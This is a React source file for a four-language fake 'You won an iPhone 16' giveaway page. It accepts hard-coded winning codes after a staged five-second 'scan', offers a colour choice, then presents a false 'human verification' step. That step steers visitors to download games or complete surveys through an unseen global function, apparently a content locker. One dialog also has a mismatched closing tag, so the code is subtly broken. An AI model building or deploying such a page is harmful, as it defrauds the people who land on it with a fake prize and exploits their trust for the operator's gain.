import React, { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { MadeWithDyad } from "@/components/made-with-dyad";
import { Loader2 } from "lucide-react";
import Header from "@/components/Header";
import { useLanguage } from "@/context/LanguageContext"; // Import useLanguage

// Define prize data
const prizeData: { [key: string]: { name: string; image: string } } = {
  "154590": { name: "iPhone 16 Pro / Pro Max", image: "/iphones.png" },
  "154570": { name: "iPhone 16 Pro / Pro Max", image: "/iphones.png" },
  "154580": { name: "iPhone 16 Pro / Pro Max", image: "/iphones.png" },
};

// Translations for Index page
const translations = {
  en: {
    title: "Enter Your Winning Code",
    subtitle: "If you have won, you should have received a winning code.",
    placeholder: "Your Code",
    checkCode: "Check Code",
    scanningCode: "Scanning Code...",
    verifyCode: "Please wait while we verify your code.",
    congratulations: "Congratulations! 🎉",
    wonIphone: "You have won an iPhone 16",
    chooseColorPrompt: "Click below to choose a color.",
    chooseColor: "Choose Color",
    chooseYourColor: "Choose Your Color",
    selectPreferredColor: "Select your preferred color for your iPhone 16.",
    black: "Black",
    green: "Green",
    pink: "Pink",
    continue: "Continue",
    lastStep: "Last Step",
    agreementText:
      "Before we can provide you with the receipt to pick up your iPhone at a nearby store, you must pass a human verification test. In our last giveaway, we found that over half of the prizes went to individuals who programmed bots to enter multiple times and then sell the iPhones. The human test is simple: it's like downloading a free game and playing it for a while, or completing some surveys, depending on your device type, to prove you are a human and not a programmed robot.",
    agree: "Yes, I agree",
    invalidCode: "❌ Invalid Code",
    incorrectCode: "The code entered is incorrect. Please try again.",
    close: "Close",
  },
  de: {
    title: "Geben Sie Ihren Gewinncode ein",
    subtitle: "Wenn Sie gewonnen haben, sollten Sie einen Gewinncode erhalten haben.",
    placeholder: "Ihr Code",
    checkCode: "Code prüfen",
    scanningCode: "Code wird gescannt...",
    verifyCode: "Bitte warten Sie, während wir Ihren Code überprüfen.",
    congratulations: "Herzlichen Glückwunsch! 🎉",
    wonIphone: "Sie haben ein iPhone 16 gewonnen",
    chooseColorPrompt: "Klicken Sie unten, um eine Farbe auszuwählen.",
    chooseColor: "Farbe auswählen",
    chooseYourColor: "Wählen Sie Ihre Farbe",
    selectPreferredColor: "Wählen Sie Ihre bevorzugte Farbe für Ihr iPhone 16.",
    black: "Schwarz",
    green: "Grün",
    pink: "Rosa",
    continue: "Weiter",
    lastStep: "Letzter Schritt",
    agreementText:
      "Bevor wir Ihnen die Quittung zur Abholung Ihres iPhones in einem nahegelegenen Geschäft aushändigen können, müssen Sie einen menschlichen Verifizierungstest bestehen. Bei unserem letzten Gewinnspiel haben wir festgestellt, dass über die Hälfte der Preise an Personen gingen, die Bots programmiert hatten, um mehrfach teilzunehmen und die iPhones dann zu verkaufen. Der menschliche Test ist einfach: Es ist, als würden Sie ein kostenloses Spiel herunterladen und es eine Weile spielen oder einige Umfragen ausfüllen, je nach Gerätetyp, um zu beweisen, dass Sie ein Mensch und kein programmierter Roboter sind.",
    agree: "Ja, ich stimme zu",
    invalidCode: "❌ Ungültiger Code",
    incorrectCode: "Der eingegebene Code ist falsch. Bitte versuchen Sie es erneut.",
    close: "Schließen",
  },
  fr: {
    title: "Entrez votre code gagnant",
    subtitle: "Si vous avez gagné, vous devriez avoir reçu un code gagnant.",
    placeholder: "Votre code",
    checkCode: "Vérifier le code",
    scanningCode: "Scan du code...",
    verifyCode: "Veuillez patienter pendant que nous vérifions votre code.",
    congratulations: "Félicitations ! 🎉",
    wonIphone: "Vous avez gagné un iPhone 16",
    chooseColorPrompt: "Cliquez ci-dessous pour choisir une couleur.",
    chooseColor: "Choisir la couleur",
    chooseYourColor: "Choisissez votre couleur",
    selectPreferredColor: "Sélectionnez votre couleur préférée pour votre iPhone 16.",
    black: "Noir",
    green: "Vert",
    pink: "Rose",
    continue: "Continuer",
    lastStep: "Dernière étape",
    agreementText:
      "Avant de pouvoir vous fournir le reçu pour récupérer votre iPhone dans un magasin proche, vous devez passer un test de vérification humaine. Lors de notre dernier concours, nous avons constaté que plus de la moitié des prix étaient allés à des personnes qui avaient programmé des robots pour participer plusieurs fois et ensuite vendre les iPhones. Le test humain est simple : il s'agit de télécharger un jeu gratuit et d'y jouer un certain temps, ou de remplir des sondages, selon le type de votre appareil, pour prouver que vous êtes un humain et non un robot programmé.",
    agree: "Oui, j'accepte",
    invalidCode: "❌ Code invalide",
    incorrectCode: "Le code saisi est incorrect. Veuillez réessayer.",
    close: "Fermer",
  },
  es: {
    title: "Introduce tu código ganador",
    subtitle: "Si has ganado, deberías haber recibido un código ganador.",
    placeholder: "Tu código",
    checkCode: "Comprobar código",
    scanningCode: "Escaneando código...",
    verifyCode: "Por favor, espera mientras verificamos tu código.",
    congratulations: "¡Felicidades! 🎉",
    wonIphone: "Has ganado un iPhone 16",
    chooseColorPrompt: "Haz clic abajo para elegir un color.",
    chooseColor: "Elegir color",
    chooseYourColor: "Elige tu color",
    selectPreferredColor: "Selecciona tu color preferido para tu iPhone 16.",
    black: "Negro",
    green: "Verde",
    pink: "Rosa",
    continue: "Continuar",
    lastStep: "Último paso",
    agreementText:
      "Antes de que podamos proporcionarte el recibo para recoger tu iPhone en una tienda cercana, debes pasar una prueba de verificación humana. En nuestro último sorteo, descubrimos que más de la mitad de los premios fueron a personas que programaron bots para participar varias veces y luego vender los iPhones. La prueba humana es simple: es como descargar un juego gratuito y jugarlo un rato, o completar algunas encuestas, dependiendo del tipo de tu dispositivo, para demostrar que eres un humano y no un robot programado.",
    agree: "Sí, estoy de acuerdo",
    invalidCode: "❌ Código inválido",
    incorrectCode: "El código introducido es incorrecto. Por favor, inténtalo de nuevo.",
    close: "Cerrar",
  },
};

const Index: React.FC = () => {
  const { language } = useLanguage();
  const t = translations[language]; // Get current language translations

  const [code, setCode] = useState<string>("");
  const [isSuccessModalOpen, setIsSuccessModalOpen] = useState<boolean>(false);
  const [isErrorModalOpen, setIsErrorModalOpen] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isColorModalOpen, setIsColorModalOpen] = useState<boolean>(false);
  const [isAgreementModalOpen, setIsAgreementModalOpen] =
    useState<boolean>(false);
  const [winningPrize, setWinningPrize] = useState<{
    name: string;
    image: string;
  } | null>(null);

  const colorOptions = [
    { name: t.black, image: "/black.png", colorClass: "bg-zinc-800" },
    { name: t.green, image: "/green.png", colorClass: "bg-teal-500" },
    { name: t.pink, image: "/pink.png", colorClass: "bg-pink-400" },
  ];

  const [selectedColor, setSelectedColor] = useState(colorOptions[0]);

  const handleCheckCode = () => {
    setIsLoading(true);
    setIsSuccessModalOpen(false);
    setIsErrorModalOpen(false);
    setWinningPrize(null);

    setTimeout(() => {
      setIsLoading(false);
      const prize = prizeData[code];
      if (prize) {
        setWinningPrize(prize);
        setIsSuccessModalOpen(true);
      } else {
        setIsErrorModalOpen(true);
      }
    }, 5000);
  };

  const handleChooseColor = () => {
    setIsSuccessModalOpen(false);
    setIsColorModalOpen(true);
  };

  const handleAgreement = () => {
    setIsColorModalOpen(false);
    setIsAgreementModalOpen(true);
  };

  const handleKeyDown = (event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === "Enter" && !isLoading) {
      handleCheckCode();
    }
  };

  return (
    <div className="min-h-screen w-full font-poppins flex flex-col">
      <Header />
      <div className="flex flex-col items-center justify-center flex-grow w-full text-center animate-fade-in p-4 md:p-8 lg:p-12">
        <h1 className="text-4xl font-bold text-gray-800 mb-4">
          {t.title}
        </h1>
        <p className="text-lg text-gray-600 mb-8">
          {t.subtitle}
        </p>
        <div className="flex flex-col sm:flex-row gap-4 mb-8 max-w-md w-full">
          <Input
            type="text"
            placeholder={t.placeholder}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            onKeyDown={handleKeyDown}
            className="flex-grow p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 transition-all duration-200 hover:border-blue-400"
            disabled={isLoading}
          />
          <Button
            onClick={handleCheckCode}
            className="w-full sm:w-auto px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105 relative overflow-hidden group"
            disabled={isLoading}
          >
            <span className="relative z-10">{t.checkCode}</span>
            <span className="absolute inset-0 bg-gradient-to-r from-blue-500 to-blue-700 opacity-0 group-hover:opacity-100 transition-opacity duration-300 blur-sm"></span>
          </Button>
        </div>
      </div>

      <Dialog open={isLoading} onOpenChange={setIsLoading}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-lg shadow-2xl text-center animate-scale-in">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-blue-600 mb-2">
              <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
              {t.scanningCode}
            </DialogTitle>
            <DialogDescription className="text-gray-700 text-lg">
              {t.verifyCode}
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      </Dialog>

      <Dialog open={isSuccessModalOpen} onOpenChange={setIsSuccessModalOpen}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-lg shadow-2xl text-center animate-scale-in">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-green-600 mb-2">
              {t.congratulations}
            </DialogTitle>
            {winningPrize && (
              <div className="mt-4 mb-6">
                <img
                  src={winningPrize.image}
                  alt={winningPrize.name}
                  className="mx-auto h-45 w-45 object-contain mb-4"
                />
                <p className="text-2xl font-semibold text-gray-800">
                  {t.wonIphone}
                </p>
              </div>
            )}
            <DialogDescription className="text-gray-700 text-lg">
              {t.chooseColorPrompt}
            </DialogDescription>
          </DialogHeader>
          <Button
            onClick={handleChooseColor}
            className="w-full py-3 mt-6 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            {t.chooseColor}
          </Button>
        </DialogContent>
      </Dialog>

      <Dialog open={isColorModalOpen} onOpenChange={setIsColorModalOpen}>
        <DialogContent className="sm:max-w-sm bg-white p-6 rounded-lg shadow-2xl text-center animate-scale-in">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-gray-800 mb-2">
              {t.chooseYourColor}
            </DialogTitle>
            <DialogDescription className="text-gray-600">
              {t.selectPreferredColor}
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center my-6">
            <img
              src={selectedColor.image}
              alt={selectedColor.name}
              className="h-64 object-contain transition-all duration-300"
            />
          </div>
          <div className="flex justify-center items-center gap-4 mb-6">
            <div className="flex gap-3">
              {colorOptions.map((color) => (
                <button
                  key={color.name}
                  onClick={() => setSelectedColor(color)}
                  className={`w-8 h-8 rounded-full ${color.colorClass} border-2 border-white transition-all duration-200 ${
                    selectedColor.name === color.name
                      ? "ring-2 ring-offset-2 ring-blue-500"
                      : ""
                  }`}
                  aria-label={`Choose ${color.name}`}
                />
              ))}
            </div>
          </div>
          <Button
            onClick={handleAgreement}
            className="w-full py-3 mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            {t.continue}
          </Button>
        </DialogContent>
      </Dialog>

      <Dialog
        open={isAgreementModalOpen}
        onOpenChange={setIsAgreementModalOpen}
      >
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-lg shadow-2xl text-center animate-scale-in">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-gray-800 mb-4">
              {t.lastStep}
            </DialogTitle>
            <DialogDescription className="text-gray-600 text-left">
              {t.agreementText}
            </DialogDescription>
          </DialogDescription>
          <div className="flex flex-col gap-4 mt-6">
            <button
              onClick={() => (window as any)._ZU()}
              className="w-full py-3 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
            >
              {t.agree}
            </button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isErrorModalOpen} onOpenChange={setIsErrorModalOpen}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-lg shadow-2xl text-center animate-scale-in">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-red-600 mb-2">
              {t.invalidCode}
            </DialogTitle>
            <DialogDescription className="text-gray-700 text-lg">
              {t.incorrectCode}
            </DialogDescription>
          </DialogHeader>
          <Button
            onClick={() => setIsErrorModalOpen(false)}
            className="w-full py-3 mt-6 bg-gray-300 hover:bg-gray-400 text-gray-800 font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            {t.close}
          </Button>
        </DialogContent>
      </Dialog>
      <MadeWithDyad />
    </div>
  );
};

export default Index;